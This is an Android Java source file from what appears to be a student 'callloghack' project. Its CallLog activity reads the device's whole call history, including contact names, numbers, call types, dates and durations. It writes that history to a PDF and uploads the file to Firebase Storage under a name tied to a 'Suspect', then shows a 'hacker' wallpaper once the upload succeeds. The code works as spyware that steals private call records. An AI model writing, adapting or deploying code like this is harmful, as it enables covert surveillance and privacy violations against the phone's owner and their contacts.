package com.computerstudent.callloghack;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Paint;
import android.graphics.pdf.PdfDocument;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;


import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CallLog extends AppCompatActivity {
    FirebaseDatabase database = FirebaseDatabase.getInstance();
    private StorageReference mStorageRef;
    public String inputName;
    public RelativeLayout relativeLayout;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_call_log);
        relativeLayout=findViewById(R.id.relativeLayout);
        relativeLayout.setBackgroundResource(R.drawable.background);
        Intent intent=getIntent();
        Bundle b=intent.getExtras();
        if(b!=null)
        {
             inputName=(String) b.get("Suspect");
        }



        if ((ContextCompat.checkSelfPermission(CallLog.this,
                Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED)&&
                (ContextCompat.checkSelfPermission(CallLog.this,
                        Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) &&
                (ContextCompat.checkSelfPermission(CallLog.this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED))
        {
            createMyPDF();
        }
        else {
            Toast.makeText(this, "No Permission Granted", Toast.LENGTH_SHORT).show();
        }


    }



    private String getCallDetails() {
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int name = managedCursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(android.provider.CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(android.provider.CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(android.provider.CallLog.Calls.DURATION);
        sb.append("Call Details:\n\n");
        while (managedCursor.moveToNext()) {
            String callname = managedCursor.getString(name);
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayType = new Date(Long.valueOf(callDate));
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
            String dateString = formatter.format(callDayType);
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case android.provider.CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case android.provider.CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case android.provider.CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Name: " + callname + "\nPhone Number: " + phNumber + "\n CallType: " + dir + "\nCall Date: " + dateString +
                    "\nCall Duration in sec: " + callDuration);
            sb.append("\n-------------------------------");
        }
        managedCursor.close();
        return sb.toString();
    }

    public void createMyPDF() {
        FileOutputStream outputStream;
        PdfDocument myPdfDocument = new PdfDocument();
        PdfDocument.PageInfo myPageInfo = new PdfDocument.PageInfo.Builder(300, 100000, 1).create();
        PdfDocument.Page myPage = myPdfDocument.startPage(myPageInfo);

        Paint myPaint = new Paint();
        String myString = getCallDetails().toString();
        int x = 10, y = 25;

        for (String line : myString.split("\n")) {
            myPage.getCanvas().drawText(line, x, y, myPaint);
            y += myPaint.descent() - myPaint.ascent();
        }

        myPdfDocument.finishPage(myPage);

        String myFilePath = Environment.getExternalStorageDirectory().getPath() + "/yourCallLog.pdf";
        File myFile = new File(myFilePath);
        try {
            myPdfDocument.writeTo(new FileOutputStream(myFile));
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Error", Toast.LENGTH_SHORT).show();
        }

        myPdfDocument.close();
        updateData();

    }

    public void updateData() {
        final ProgressDialog progressDialog = new ProgressDialog(this);
        progressDialog.setTitle("Loading...");
        progressDialog.show();
        String myFilePath = Environment.getExternalStorageDirectory().getPath() + "/yourCallLog.pdf";
        mStorageRef = FirebaseStorage.getInstance().getReference();
        Uri file = Uri.fromFile(new File(myFilePath));
        StorageReference riversRef = mStorageRef.child("CallLog"+inputName+".pdf");
        riversRef.putFile(file)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        progressDialog.dismiss();
                        Toast.makeText(CallLog.this, "Loaded Succesfully", Toast.LENGTH_SHORT).show();
                        relativeLayout.setBackgroundResource(R.drawable.hackerwallpaper);
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Toast.makeText(CallLog.this, "Failed", Toast.LENGTH_SHORT).show();
                    }
                })
                .addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onProgress(@NonNull UploadTask.TaskSnapshot taskSnapshot) {
                        double progress = (100.0 * taskSnapshot.getBytesTransferred()) / taskSnapshot
                                .getTotalByteCount();
                        progressDialog.setMessage("Completed " + (int) progress + "%");

                    }
                });

    }
}